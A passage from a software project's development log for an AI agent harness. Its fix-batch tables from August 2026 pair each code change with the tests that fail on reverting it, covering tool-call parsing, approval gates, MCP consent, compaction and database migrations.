| Widen the cap check to `<= MAX + 1` | `test_a_description_at_the_cap_is_untouched` | Its earlier form asserted `!= exact`, which an off-by-one satisfies: the over-cap string comes back unchanged and is indeed not the shorter one. "Different from" is not "bounded by" |
| Refuse an over-long description instead of truncating | Nothing fails — and it is the wrong trade | A description is advisory prose read by a model, so it degrades gracefully. Skipping the file loses a whole working skill over the length of its summary. The one exception is a name collapsing to `""`, which DOES hand back to skip-and-warn: D18's collision rule cannot reason about a nameless definition |
| Show the RAW frontmatter in the trust prompt | `test_what_is_shown_is_what_would_be_injected` | A summary displaying something other than what reaches the prompt is worse than showing nothing — it invites trust in a string that is not the one used |
| Skip an unparseable project definition in the summary | `test_an_unreadable_definition_is_reported_not_hidden` | This function runs only on untrusted content. "This file is here and I cannot tell you what it says" is a fact the person answering needs, and silently omitting it makes a malformed file the way to stay out of the summary |
| Default `spawnable` to `True` when undeclared | `test_a_user_agent_that_omits_it_loads_as_not_spawnable`, `test_no_spawnable_agent_means_no_section_at_all` | An agent written for `/agent` and silently advertised as spawnable is #69's actual complaint |
| Extend the harness-tier assertion to every tier | `test_a_user_agent_that_omits_it_loads_as_not_spawnable` | See the asymmetry above. Our omission is a build error; a stranger's gets the safe answer |
| Treat `spawnable: false` as a ban rather than a catalog filter | `test_a_non_spawnable_agent_is_still_reachable_by_hand` | `/agent` lists `manager.names()`. A human selecting `grill-me` supplies the thread it needs by BEING in one — the agent is not broken, the delegation route is |
| Clear `needs_approval` in the loop without a dispatch-side check | `test_the_refusal_still_reaches_the_model` | `needs_approval = False` is not "proceed". dispatch re-checks approval itself, finds no callback, and reports "requires approval and was not given" — a cause that is not the cause, and worse than the empty modal it replaced |
| Move the pre-flight after dispatch's approval gate | `test_an_unknown_agent_produces_no_question` plus the test above | The order IS the fix |
| Raise `ToolCallDenied` from the pre-flight instead of returning | `test_the_handler_returns_exactly_what_the_pre_flight_reported` | A refusal is the tool's own answer about its own call. `ToolCallDenied` means policy blocked you, which is a different fact the model should be able to tell apart |
| Have `refusal_reason` return a reason for everything | `test_a_valid_spawn_IS_still_asked_about` | It would satisfy every "no question was raised" assertion while silently removing §18's sign-off — the mechanism that makes delegation something a human agreed to |
| Give chat the pipeline's closing sentence | `test_chat_names_the_person` | It tells a chat turn its instructions come from a pipeline it is not in. Asserted on `DEFAULT_SYSTEM_PROMPT`, not on the constant: an earlier version checked the constant, so swapping which one `core/loop.py` reaches for was invisible |
| Keep a second copy of the defence paragraph | `test_there_is_exactly_one_copy_on_disk` | Two copies is how one gets improved and the other does not, and the one that does not would be whichever mode nobody was thinking about — which is how #72 happened |
| Edit the preamble so a pass prompt changes | `test_the_pass_prompt_is_byte_identical`, per pass, by digest | A8 moves text between files. Rewriting ten pass prompts is not something to do as a side effect of a chat fix. If the change is deliberate, the digest is what needs updating — and the failure is the prompt to think about whether the pipeline meant to change |
| Rename `zulu`/`alpha` back to `first`/`second` in the pinning test | `test_multiple_active_skills_are_pinned_in_order` stops discriminating — nothing fails | `sorted(["first", "second"])` is already that order, so the one test named for the pinning order held whether `prompt_fragment` preserved activation order or sorted. The assertion was right; the inputs could not tell the implementations apart |
| Call `headless_hidden()` with no context in `candidate_approvals` | `test_candidate_approvals_is_computed_FOR_THE_CHILD_not_globally` | Not an escalation — `allowed_tools` still narrows at dispatch. The defect is the sign-off NOTICE promising authority the grant does not carry, which that function's own docstring calls worse than not offering it |
| Start `active_context` at `subagent_depth=1` | `test_active_context_starts_at_depth_zero` | It silently halves the nesting budget for a `/agent`-switched session and nothing reports the difference |
| Let the parent run's model beat the agent's declared one | `test_an_agents_declared_model_beats_the_parent_runs` | "An agent's declared model/provider is its identity", and `effort_for`'s docstring cites this exact inversion as one of three ways a wrong effort used to reach the wire |

### Two things measured here that are not this batch's doing

**No shipped builtin is both approval-gated and `GRANT_ANYWHERE`** — `remember` and
`spawn_subagent` are `never`, `write_project_doc` is `signoff_only` — so R15's granted branch in
`is_advertised`/`schemas()` is reachable today only by an MCP tool. Its control test registers one
rather than selecting off the roster, because a skipping control is not a control.

**A fix that empties a collection makes every test asserting absence from that collection vacuous.**
A4 emptied the agent catalog, and three assertions in `test_review.py::TestCatalogsFollowTheContext`
would have passed for the wrong reason — *absent because the context suppressed it* and *absent
because there was nothing to suppress* are the same observation. That class now has three recorded
instances (§31's `os.times()`, #71's `first`/`second`, this), and this is the first found by making
the change rather than by sweeping for it. The batch that empties the collection is the only moment
anyone is positioned to notice.


## §29 — the thirteenth fix batch: the call boundary (2026-08-21)

> Same section-number collision as §28 records: this file's counter is independent of ROADMAP_v2's,
> so this §29 is the thirteenth fix batch, recorded in ROADMAP_v2 **§33**.

Closes audit **#37** (S2, stability), **#38** (S3), **#39** (S3) and **#135** (S3, performance) —
and with them **unit 3 (#41)**, the first unit *tracker* of Audit Pass 1 to be closed. (Corrected
in §30: unit 3 was the eighth unit **finished**, not the first. Units 16 and X4 were complete on
2026-08-17.)

### The change that breaks code outside this repository, stated first

**Four public names are gone from `core.client`:** `call_model()`, `collect_response()`,
`list_models()`, `select_model()`. So is **`ModelResponse.raw`**. Nothing in the tree called any of
them; `core/loop.py` calling `call_model_stream` is the only model call site there has ever been.

`raw` is the one worth a sentence. It was set only by `call_model`, and every streaming branch
omitted it, so it was `None` on every live path behind a comment reading *"original SDK response,
kept for logging/debugging only"*. Deleting `call_model` without deleting `raw` would have turned a
field that was accurate-but-divergent into one that was simply false.

A caller that wants the streaming result without the events writes the four-line drain itself —
which is what `collect_response` was, and what both test files now do locally. Shipping it as a
public entry point nobody called is how `call_model` got where it did.

### If you change this, this is what fails

| change | what fails | why it is that way |
|---|---|---|
| Parse `arguments` with a bare `json.loads` again | `test_a_truncated_tool_call_does_not_raise_out_of_the_generator` | `dispatch()` turning a handler's exception into `{"error": ...}` is the whole reason a raising TOOL cannot kill a run. Nothing played that role for a raising TRANSLATION, so a response cut mid-arguments took a JSONDecodeError into the pipeline's `except Exception` — `status='failed'` on a run that had finished nine passes |
| Raise from `_tool_arguments` instead of returning | `test_the_refusal_reaches_the_model`, and the mutation `W1-parse-failure-raises-again` | A10's rule. A refusal is the boundary's own answer about one call; raising loses the turn, and the model never learns it can reissue |
| Return `{}` with no error on a parse failure | `test_a_malformed_call_is_never_dispatched` | The arguments are `{}` by then, so a tool that tolerates empty params would RUN — `web_search` with no query. Refusing is not tidiness |
| Accept JSON that is not an object | `test_valid_json_that_is_not_an_object_is_refused`, parametrised over `null` / list / int / str | `json.loads("null")` is not an error — it returns `None`, and `input=None` reaches every handler. Rarer than a truncation, caught in the same place because the consequence is the same |
| Drop the `if not raw_args` fallback | `test_empty_arguments_are_not_an_error` | `get_time` declares `properties=[]` and `pin` has no required parameters, so this is a live path. Unit 3's mutation P10 deleted it and was GREEN on all 1406 — nothing covered a tool call with no arguments |
| Stop reading `finish_reason`, or report every failure as a length cut | `test_a_length_cut_is_named_as_one` and `test_bad_json_is_NOT_reported_as_a_length_cut` | The second is the control. Reporting every parse failure as a truncation would make the branch unfalsifiable and tell the model to shorten arguments that were never too long |
| Drop `or finish_reason` | `test_finish_reason_is_kept_once_seen` | A last-write-wins defence of the same family as the `name_parts` accumulation twenty lines above, reachable for the same reason: a provider that keeps emitting choices after the one carrying the reason. **This mutation survived once** — see the note below |
| Test it with the usage chunk instead | nothing fails, and that is the point | A usage chunk has `choices: []`, so `if chunk.choices:` skips it and the line is never reached. `test_a_usage_chunk_cannot_clobber_the_reason` pins the fact that made the wrong version look right |
| Persist `parse_error` with the tool call | `test_the_parse_error_never_reaches_storage` | W2. It describes one wire read, not the thread. In a resumed history a later turn would read it as something the assistant said |
| Drop the malformed call instead of carrying it | `test_the_call_is_carried_not_dropped` | The model made a call and is owed an answer. Dropping it leaves a `tool_use` with no matching `tool_result` — M4's pairing defect — and makes a truncated call look like a turn that called nothing |
| Ask the user to approve a call that cannot run | `test_no_approval_is_asked_for_a_call_that_cannot_run` | A7's rule. Approving it could not make it runnable, and headless the old path reports "requires approval and was not given" — A7's exact wrong-cause failure |
| Refuse every call rather than only malformed ones | `test_a_well_formed_gated_call_IS_still_asked_about` | The control. A guard that suppressed every question would satisfy the test above while silently removing approval |
| Move the refusal into `dispatch()`, as A7's is | it cannot be done, and W1 records why | `dispatch(name, params, context)` never sees the failure — `{}` is a perfectly good empty dict by the time it arrives. The loop is the only layer that can see a `parse_error` |
| Delete `_run()`'s no-final-response guard | `test_a_stream_with_no_final_response_raises` | That contract belonged to `collect_response`, which had its own test. Deleting the helper must not delete the property, and `core/loop.py` was the only enforcement left — untested until this batch |
| Import a provider SDK at module scope | `test_importing_core_client_does_not_import_any_provider_sdk` | `core.loop` imports this module and `main.py` imports `core.loop`, so it is paid by every invocation of either shell before argparse runs. Measured: 1,766 ms of a 2,619 ms `--help`. A SUBPROCESS test, because the root conftest stubs all three into `sys.modules` before collection |
| Hoist `genai_types` to the top of its function instead of into the branch | `test_importing_core_client_does_not_import_any_provider_sdk` stays green, and the defect is back | Three of the five functions use it only on their GOOGLE branch, so a top-of-function import is paid on every ANTHROPIC turn. This is the issue's own suggested fix, and it is wrong |
| Check `"google" in sys.modules` rather than `"google.genai"` | nothing fails, and the check is worthless | `google` is a namespace package protobuf puts in `sys.modules` regardless. This batch made that mistake once while measuring and reported a false positive to itself |
| Patch `core.client.genai_types` in the effort-gate test | `test_google_gate_inspects_the_sdk_class` errors on a missing attribute | There is no module-scope name any more. It patches `google.genai.types` itself — the stricter target, since that is the module the function imports from |

### The survivor, and the sub-shape of the vacuity class it exposed

One of 24 mutations survived: deleting `or finish_reason`, on a line this batch had **written a
test for**. The test asserted that a length cut is still reported after the usage chunk arrives.
True, and irrelevant — the usage chunk has `choices: []`, so the line under test is never reached.

Driven both ways before rewriting, rather than guessed. With `or finish_reason` deleted, the
usage-chunk shape still reports the length cut; a trailing chunk that *has* choices and a null
`finish_reason` falls back to the generic message.

The vacuity class now has four instances, and this is a new sub-shape. §31's `os.times()`, #71's
`first`/`second` and #69's emptied catalog are all inputs that cannot **discriminate**. This is an
input that cannot **arrive** — a guard upstream skips it. The usual sweep (vary the input, see
whether the assertion still holds) does not find it, because the assertion does hold, for a reason
unrelated to the code under test.


## §30 — the fourteenth fix batch: /init's vocabulary (2026-08-21)

> This file's counter is independent of ROADMAP_v2's, so this §30 is the fourteenth fix batch,
> recorded in ROADMAP_v2 **§34**.

Closes audit **#96** (S2, correctness), **#94** (S3), **#95** (S3) and **#98** (S3) — and with them
**unit 12 (#99)**.

### The change that affects code outside this repository, stated first

**`read_project_doc` accepts five more filenames:** `setup.py`, `setup.cfg`, `Gemfile`, `pom.xml`,
`build.gradle` — **at the project root only**. They are exact-basename entries, so `.py` is not a
readable extension and `main.py` stays refused; and they are the first entries in `_DOC_FILENAMES`
that do not match at any depth, so `src/vendor/setup.py` stays refused too.

`manifest.detect_facts()` gains a `code_manifests` key (a list, in table order) and now sets
`stack` for ten of the twelve manifest filenames rather than seven. `_MANIFEST_FILES` is gone,
replaced by `_MANIFEST_TABLE`; `propose_kind`'s reason string now names the files it found.

`InitError` may carry a multi-line message. Both shells already print it verbatim.

### If you change this, this is what fails

| change | what fails | why it is that way |
|---|---|---|
| Branch `propose_kind` on `stack` again | `test_every_manifest_that_names_a_stack_proposes_software`, parametrised over ten filenames | "Is this a codebase" and "what is it written in" are two questions. Answering the first with the second made a Java, Ruby, Gradle, C or container project `research` — and printed *"no code manifests found"* as the reason while the manifest listed the manifest |
| Give `Dockerfile` or `Makefile` a stack | `test_a_build_file_proposes_software_with_no_stack_claimed` | The fix is not "give every manifest a stack". A Makefile is C, Go, LaTeX or this repository; a Dockerfile says nothing about what is inside the image. Strong evidence of a codebase, none at all about the language |
| Drop the filenames from the reason | `test_the_reason_names_the_files_it_found` | I13 returns the reason *"so the confirmation prompt can show its working"*, and for this heuristic the filename **is** the working |
| Claim `make test` without the target | `test_make_test_is_claimed_only_when_the_target_exists` | I10: a fact in a committed document is read as established, and a wrong one is worse than an absent one |
| Match `test` as a prefix rather than `^test\s*:` | `test_a_tests_target_is_not_a_test_target` | The control. A target name is exact, and `tests:` is a different target |
| Claim `bundle exec rspec` with no `spec/` | `test_rspec_is_claimed_only_with_a_spec_directory` | Ruby's runner is a choice; minitest and rspec are both ordinary |
| Ignore a shipped `gradlew` | `test_the_gradle_wrapper_is_preferred_when_the_project_ships_one` | Shipping a wrapper is a statement about which Gradle to use |
| Let a default beat `package.json`'s `scripts.test` | `test_package_json_still_wins_over_pytest` | Precedence a table could quietly reorder. A project holding both has decided something |
| Emit one stack per matching file | `test_one_stack_is_named_once_however_many_files_say_it` | Four of the twelve filenames say Python. The stack line is for a human reading a confirmation prompt |
| Make `code_manifests` a set | `test_the_manifest_list_is_in_table_order_not_set_order` | It is printed to the user behind a proposal, and a set prints in whatever order the interpreter felt like that run |
| Give the manifest listing its own idea of what is readable | `test_every_advertised_path_is_one_the_tool_accepts` | The listing prints *"Paths below are exactly what read_project_doc expects"* over it. Advertised 15, refused 6 — and each refusal costs one of the initializer's twelve steps |
| Narrow the listing back to extensions | `test_nothing_readable_is_hidden_from_the_listing` | The direction nobody would notice: `.txt` was readable and invisible, so a project keeping its notes in `.txt` had them unlisted |
| Advertise `readme.bin` again | `test_a_readme_the_tool_cannot_read_is_not_advertised` | Fixed listing-side. It stays in the LAYOUT, which is not an advertisement — the tree says what the project contains, the listing says what can be read |
| Match the five build manifests at any depth | `test_a_nested_copy_of_a_build_manifest_is_refused`, parametrised over all five | A vendored tree is where unreviewed third-party source lives, and it is the one place these five are not the project's own statement about itself |
| Add `.py` to `_DOC_EXTENSIONS` | `test_adding_setup_py_did_not_add_python`, over five filenames | The whole basis on which the widening was taken. A suffix entry turns `read_project_doc` into `read` with no approval gate, for every run in the harness |
| Drop one of the five names | `test_the_five_build_manifests_are_readable_at_the_root` | |
| Remove `except InitError` from the write loop | `test_a_write_that_fails_names_the_files_it_already_created` | `ToolCallDenied` cannot fire there — consent is granted a few lines above — while `_write` raises `InitError` for every error dict, which is where every OSError arrives |
| Settle trust only on success | `test_a_partial_write_leaves_a_trusted_project_trusted` | The partial write has already moved the D17 hash, so I6's bad outcome arrives by the route I6 was not looking at |
| Grant trust regardless of `was_trusted` | `test_a_partial_write_does_not_launder_an_untrusted_project` | The control. Granting on a failed /init would launder a cloned `.venastine/` in through a door nobody is watching |
| Drop the list of files already written | `test_a_write_that_fails_names_the_files_it_already_created`, and `test_a_failure_before_anything_was_written_says_so` | The second is the control: "Nothing was written" is a different sentence from a list of length zero |
| Roll the partial write back | `test_a_partial_write_is_not_rolled_back` | It would be true of the stubs and false of the file that mattered — `CONTEXT.md`'s previous content is gone by the first step |
| Ignore `_write`'s error dict | the four tests above | The branch every filesystem failure takes. Only `ToolCallDenied` was covered, and a normal /init cannot reach it |
| Build the index from `all_document_names()` | `test_the_index_is_a_pure_function_of_the_kind` | It asserts the exact line set per kind now. The old version compared a call to itself and then checked each name was present, which catches a MISSING name and cannot see an extra one |
| Remove `sorted()` from `_root_documents` or `_tree` | `test_the_manifest_is_stable_across_runs`, `test_the_layout_is_sorted_too` | Both hold the filesystem still with `_hand_back_reversed`, because NTFS returns sorted names anyway and the tests could not otherwise see the sort — which is how the versions they replace came to be green |
| Drop `_PRUNED`, or drop the dotfile filter | `test_the_walk_prunes_the_directories_that_would_flood_it`, `test_the_walk_prunes_dotted_directories_too` | Two mutations, two tests. `node_modules` "turns a listing into a denial of service on the context window"; `.venastine` holds mcp.json and settings.json, neither covered by `_is_secret` |
| Prune everything | `test_a_directory_that_should_be_walked_still_is` | The control |
| Change `f.read(4096)` to `f.read()` | `test_a_heading_is_read_from_the_head_of_the_file` | ~1 MB of reads per manifest build in this repo. The padding is BLANK LINES: `_first_heading` returns on the first non-empty line, so `x`-padding cannot reach the cap at all |

### The two survivors, and why they are in this record

27 mutations, two survivors — and both were tests **this batch wrote for #98**, the finding about
tests that cannot see the property in their own name. `os.walk` hands back an already-sorted list
on this filesystem, so three ordinary filenames could not discriminate `sorted()`; and
`_first_heading` returns on the first non-empty line, so a heading after 5,000 `x`s was unreachable
whether the read was capped or not.

Both were diagnosed by running them, not by rereading them. The lesson is the one #98 states —
a test named for a property it cannot see *"reads as coverage in a report, which is worse than an
acknowledged gap"* — and it applies to the fix as much as to the thing being fixed. **Final: 27 of
27 RED.**


## §31 — the fifteenth fix batch: the record's index (2026-08-22)

Audit issues **#16**, **#17**, **#147** and **#91**. Closes unit X5 (#148); #16 and #17 belong to
the master tracker #15 rather than to a unit.

Three of the four were filed as separate defects and are one: **an id that cannot be found, or that
resolves to two things.** The fix is one check rather than three prose corrections, which is #147's
own argument — prose is what drifted.

### If you change this, this fails

| Change | Fails | Why the property exists |
|---|---|---|
| Move `S1`–`S4` or `E1`–`E12` back out of `ROADMAP_v2.md`'s record | `test_every_decision_id_the_map_claims_is_in_the_record` | `AGENTS.md`'s map says the ROADMAPs carry the record. All sixteen were `DEVLOG`-only, and this project's convention on finding no record is to **re-derive** the decision (#16) |
| Drop a `C` definition, or the whole family | same | `C3`/`C6`/`C10` are cited as authority in six production files and in this document; `C6` is intersection-never-union, one of the few where re-deriving it wrongly silently widens a subagent's reach (#147) |
| Stop naming `E` or `C` in `AGENTS.md`'s map | `test_the_map_names_every_family_the_record_defines` | The forward direction cannot see a family the map never mentions. `E` was omitted while `AGENTS.md`'s own ensemble section cited nine `E` ids by number (#148) |
| Add a family to the record and not to the map | same | Caught this batch's own omission on the check's first run |
| Claim a range in the map wider than the record holds | `test_every_decision_id_the_map_claims_is_in_the_record` | The map is where a reader learns which ids exist |
| Write `C1–C10` as a range in the map | same | `C` is **sparse** — C1, C3, C6, C8, C10. Only the conflicts with live citations were recovered |
| Remove `§21` from an `AC` citation | `test_every_decision_id_cited_in_production_code_resolves` | `AC` is section-scoped. `AC6` alone meant three different criteria in three files — §17's, §21's and §21b's (#17) |
| Remove `gate` from a `D0` citation | same | There is no decision `D0`; the record starts at `D1`. `D0` is a pipeline routing gate |
| Remove `Rev. 1` from `S12`, or `mutation` from `P10` | same | The `S` record stops at S4 and the `P` record at P4; both citations sit inside a decision family's numbering |
| Let a `review finding` qualifier wrap onto the line above its id | same | A reader greps one line at a time. `core/config_loader.py:122` was qualified in prose and unqualified to a grep |
| Cite a new id in production without defining or qualifying it | same | The check is a **qualifier grammar**, not a list of blessed ids, so it covers the citation nobody has written yet |
| Teach the definition scanner only one of the three shapes | `test_the_definition_scanner_sees_every_shape_the_record_uses` | The record writes a decision three ways. Knowing only table rows loses the whole `M` family, 21 ids — which is what this batch's first census did |
| Narrow `_DEFINITION_ROW` to require bold, or `_DEFINITION_LEAD` to require the dash outside it | same | One shape each: `\| D1 \|` is unbolded, `**M1 — ...**` has the dash inside |
| Widen a namespace's `covers` so any id can carry that qualifier | `test_the_qualifier_grammar_discriminates` | The loosen-the-check mutation: the citation test passes trivially while nothing about the documents changes. A section number must not qualify a **decision** that follows it (`§32 A3`) |
| Unanchor a single-word qualifier so it may sit anywhere on the line | same | `gate` must be adjacent. A sentence mentioning gates that then cites one is prose, not a qualifier |
| Stop reading docstrings in `_prose_lines` | `test_the_citation_scan_reads_docstrings_and_not_runtime_strings` | **The survivor that mattered.** A scan that reads less finds nothing wrong, and finding nothing wrong is what passing looks like. Most citations are in docstrings |
| Start reading runtime strings in `_prose_lines` | same | The pipeline's stage names **are** the strings `"D0"`/`"D1"` and its trace lines are keyed by them; `test_pipeline_trace_contains_expected_lines_in_order` matches on the `D0:` prefix |
| Drop the `(?<!-)` guard from `_CITATION` | `test_a_range_citation_does_not_report_its_own_endpoint` | A range's trailing endpoint is not a citation. Over a sparse family, `C1-C10` would report five decisions that never existed |
| Restore "and where they came from" to `effective_compaction`'s docstring | *nothing* — see below | Honest gap: it is a prose claim with no computable counterpart. `TECHNICAL_DEBT.md` item 12 carries it instead |

### One row with no test, stated rather than hidden

`effective_compaction`'s docstring promised provenance the function does not return (#91 item 2).
There is nothing for a test to compare a docstring's first sentence against, so this one is guarded
by the register rather than by the suite — `TECHNICAL_DEBT.md` item 12, which names both decisions
the eventual builder faces: the return shape (twelve call sites subscript the flat dict) and where a
user would read it (there is no `/config`).

### The pair nothing can force

`D1` and `D2` are both decisions **and** pipeline gates. Both resolve, so the check cannot tell
which was meant, and no amount of grammar fixes that without renumbering — which #147 rejected
because the ids are in six production files. Write `gate D1` when you mean the gate.

## §32 — the sixteenth fix batch: compaction's boundaries (2026-08-22)

Audit issues **#45**, **#44 + #172**, **#89**, **#43**, **#90** and the
surviving items of **#92**. One owner decision rides along: `MAX_ITERATIONS`
is 50 now (it was 20), because #45's repair default is this constant and a
clamp that repairs to one number while every turn runs at another would be
two answers to one question.

### If you change this, this fails

| Change | Fails | Why the property exists |
|---|---|---|
| Re-widen the loader's max_steps guard to type-only (`config_loader.py`) | `test_yaml_boolean_max_steps_is_repaired_with_a_naming_warning`, `test_negative_max_steps_is_repaired_not_crashed` | #45: `-1` passed the type check, was truthy at every call-site fallback, and crashed `_run` three layers from the frontmatter line. Repair-not-reject is an explicit owner decision — the file keeps its agent, the field falls back to undeclared, and the warning names the original |
| Delete `_run`'s max_steps belt (`core/loop.py`) | `test_non_positive_max_steps_raises_named_valueerror_not_attributeerror` | Direct callers bypass the loader; the old failure was an AttributeError on `response.stop_reason` after an empty step loop. The raise names the parameter and the loader default instead |
| Change the derived-mode mapping in `_derived_compaction_mode` (`core/loop.py`) | `test_a_re_entered_machinery_thread_asks_in_backstop_mode`, `test_a_resumed_chat_thread_keeps_the_working_set_trigger`, `test_an_explicit_mode_beats_the_derivation`, `test_a_spawned_subagent_thread_derives_backstop_without_being_told` | #43: a re-entered machinery thread ran on the chat trigger because continue_conversation could not express a mode. Explicit beats derived -- stream_deep_research_mode stays the definition site |
| Make `compact()` return None on a no-progress exit again, or move logging back inside it | `test_an_empty_summary_skips_compaction`, `test_a_missing_compactor_agent_is_a_skip_not_a_crash`, `test_no_new_turns_means_no_model_call`, `test_the_standing_condition_warning_is_also_said_once_per_run` | #44: reportability lives with the caller. Per-evaluation WARNINGs were heard 21x/turn while the notice was deduplicated to one |
| Drop the notices field from OneShotFinished, or un-inline the /compact outcome text | `test_a_one_shot_surfaces_the_notices_its_turn_raised` | #172: the one-shot drained through run_to_completion, so a compaction at its boundary reached neither route |
| Delete `unpin`, or make pin trim instead of refusing over-cap | `test_unpin_is_registered_and_symmetric_with_pin`, `test_unpin_releases_and_reports_what_remains`, `test_an_over_cap_pin_is_refused_with_numbers_and_changes_nothing` | #89: D26 called pin reversible while nothing reversed it; trimming would silently deliver less protection than asked (M15) |
| Revert `COMPACTION_STRATEGY` to rederive without the gate, or silence the forced-chain WARNING | `test_a_rederive_span_that_outgrows_one_call_forces_chain_and_says_so`, `test_an_oversized_span_with_no_previous_is_truncated_and_says_so_twice`, `test_chain_configured_does_not_claim_a_forced_switch`, `test_an_oversized_thread_is_truncated_and_the_row_says_so` | #90: three documents promised a fallback that did not exist. The truncation marker is deterministic on the stored row -- never trusted from model compliance |
| Delete the `[called: ...]` line in `_as_text`, or stop _chars counting tool_calls | `test_a_folded_turn_names_the_tools_it_called`, `test_the_estimate_counts_what_a_turn_weighs` | #92 items 1-3: the only signal a folded turn used tools, and the pre-measurement estimate is a resumed thread's whole first-call signal |

## §33 — the seventeenth fix batch: MCP's edges (2026-08-22)

Six issues, one subsystem (#60, #61, #62, #63, #64, #65); decisions F1–F8 in
`ROADMAP_v2.md` §37. Commits `7a05ee0`, `408af65`, `85fd108`, `dd5b5cb`,
`dc02251`, `74f6d19`.

| Change | Tests that fail if reverted | Why it matters |
|---|---|---|
| Put `sse` back in the streamable alias set, or let `_transport_for` hand an SSE server a bare URL string | `test_an_explicit_sse_type_is_its_own_transport_not_an_alias`, `test_an_sse_server_always_builds_its_own_transport_never_a_bare_url` | A bare URL string means STREAMABLE HTTP to v2's Client() — the silent misconnection is the type of the returned object, which is why the tests assert on type |
| Let a declared-but-unsupported type fall through to HTTP | `test_a_declared_unsupported_type_refuses_rather_than_falling_through` | M7: validation is by connecting, but only for entries we understood; a named error is the contract |
| Drop the security-posture lines from describe(), or print env VALUES | `test_describe_names_auto_approve_the_field_that_removes_every_future_prompt`, `test_describe_shows_cwd_disabled_and_env_key_names` | The one field that decides whether any future prompt exists was invisible at the only moment the user was asked; values on the terminal is a different defect |
| Feed describe()'s text into entry_digest, or drop VENASTINE_MCP_ACK_FULL handling | `test_improving_describe_alone_never_reasks_an_acknowledged_server`, `test_venastine_mcp_ack_full_appends_the_raw_entry_verbatim` | Text feeds nothing: the digest hashes the raw entry, so wording changes never re-ask and F3's bump is the ONE deliberate re-consent |
| Treat legacy stores as known, or carry legacy digests forward in remember_server | `test_a_legacy_store_reasks_every_server_exactly_once`, `test_acknowledging_one_server_does_not_convert_its_unasked_siblings` | v1 consents were blind (no autoApprove in the prompt); one answer must never convert unasked siblings |
| Revert teardown to three sequential per-stage timeouts | `test_a_wedged_server_is_named_and_the_budget_holds` (elapsed arm) | ~45s worst case hung a quitting harness, Ctrl+C included; the budget is SHARED, so the test bounds total elapsed, not any stage |
| Make _TrackClose record cancelled closes as clean, or delete the straggler WARNING | same test (straggler arms) | "We stopped waiting for it" is what the straggler line means; naming requires recording only unexceptional exits |
| Delete disconnect_all's cancel fallback, or unregister from teardown_mcp | `test_non_graceful_shutdown_still_cancels_the_manager`, `test_teardown_unregisters_what_setup_registered` | M18 asserted on _done (cancellation), not bookkeeping; F7 makes ARCHITECTURE.md's "disconnect handling" claim true |
| Fetch the catalogue again in register_all | `test_registration_never_fetches_the_catalogue_over_the_wire` | MCP's one timeout-less bridge call; the live session is poisoned in the test so any fetch fails loudly |
| Delete the disabled-skip, register_all's listing guard, future.cancel(), or sort_keys | `test_disabled_servers_are_never_connected`, `test_one_servers_listing_failure_does_not_abort_servers_after_it`, `test_a_timed_out_call_cancels_its_future`, `test_entry_digest_is_stable_under_key_reorder` | M17/M25/M13/M5 — each mutation survived the suite before this batch; each test now dies with its line |

## Batch 18 -- the eighteenth fix batch: persistence and the picker (2026-08-22)

| Change | Tests that fail if reverted | Why it matters |
|---|---|---|
| Drop NOT NULL from ensure_columns' DDL, or stop carrying nullability through _declared_columns | test_not_null_is_carried_when_a_literal_exists, test_a_migrated_column_matches_the_fresh_schema_exactly | #26: a migrated database must permit exactly what a fresh one permits; the PRAGMA flags are compared directly against create_all's output |
| Make the no-literal not-null case silent, or refuse it outright | test_a_declared_not_null_column_without_a_literal_stays_nullable_and_warns | SQLite cannot ADD COLUMN ... NOT NULL without a default; nullable-plus-WARNING is the honest degradation, silence is the defect |
| Let advances() return True unconditionally when no checkpoint exists yet | test_a_first_compaction_refuses_a_watermark_from_another_thread, test_advances_containment_holds_before_any_checkpoint | #27: first compaction is when nothing else catches a foreign watermark; containment must hold before the ordering comparison can |
| Filter list_memories in Python again, or drop the visibility WHERE clause | test_the_pushed_down_visibility_query_matches_the_old_filter_exactly (plus the AC6 pair beside it) | #28: two indexed columns had no reader; the push-down is what makes them load-bearing, and the edge set -- NULL-path project row included -- must survive it verbatim |
| Order the picker by created_at again, or stop stamping last_activity_at in save_message | test_working_in_an_old_thread_lifts_it_above_a_newer_one (and the tool-row and no-message arms beside it) | #32: most recent first must mean most recently ACTIVE; the stamp rides the single MessageLog writer so message and activity cannot drift |
| Load every user message and keep the first in Python again, or drop the rn==1 pick | test_the_preview_query_returns_the_first_user_message_of_every_thread | #30: the window function is what makes ONE query mean one ROW per thread; 40x over-read was ~98% of picker cost |
| Apply list_threads limit before ordering, or ignore it | test_list_threads_limit_caps_after_ordering | Q7: the cap must keep the globally most-recently-active rows or it silently hides exactly the threads users want |
| Make get_thread / latest_checkpoint / latest_thread_summary return detached ORM instances again | test_a_backwards_watermark_is_refused and the whole fake-mirror set (test_fake_storage_mirror.py included) | #31: attribute access on a detached instance works only until something expires it; two of the three reads sit on the compaction path where a wrong read rewrites a live conversation |

## Batch 19 -- the nineteenth fix batch: ensemble mode, honest and visible (2026-08-23)

Five production contracts changed. Every test below was driven RED against its
reverted line before the fix commit landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| `PipelineRunRecord` gains `candidates_json` (#77/E13) | A pre-batch row reads NULL after `ensure_columns`' ALTER | `load_pipeline_run` guards with `or "[]"`; pinned by building that row shape (`test_load_pipeline_run_survives_a_legacy_null_candidates_column`) |
| `update_pipeline_run` strips `text` from candidate entries | The database silently growing a third copy of every response | Exact key-set assertion on the round-trip; strip-filter mutation RED |
| Ensemble artifact layout: `01_candidate_N.md` when >=2 survive, else byte-for-byte `01_raw_response.md` (#77/E13) | A reader expecting the historical name on a degraded run | Both shapes pinned in `test_output_writer.py`; the >=2 gate is mutation-sighted |
| Pass 3b's input carries all labelled survivors instead of bare `raw_response` (#77/E13) | Anything matching the old input prefix | `critic_pass.md` reworded deliberately; `PASS_DIGESTS["Pass 3b"]` updated with a comment; single-candidate shape pinned unchanged |
| `pass_complete` gains `ok`/`text`; widget's `pass_completed(pass_id, *, ok)` REQUIRED (#115/E14) | An old caller omitting ok now TypeErrors at the widget -- the lock against ticking a failed row done | Sequence tests pin ok=False before a fatal raise and around an ensemble skip; removing the emission turns both RED |

Count 2232 -> 2241.

## Batch 20 -- the twentieth fix batch: what the harness does silently (2026-08-23)

Three production contracts changed, one of them behind a new switch. Every
mutation below was run RED against its reverted line before its commit landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| `check_output_policy` logs every alteration (#49) | A test asserting silence on an altered result | One WARNING per altered dispatch call naming tool/kind/count (+capped keys); five pins in `TestOutputPolicyAlterationsAreVisible`; silencing the block turns 3 RED |
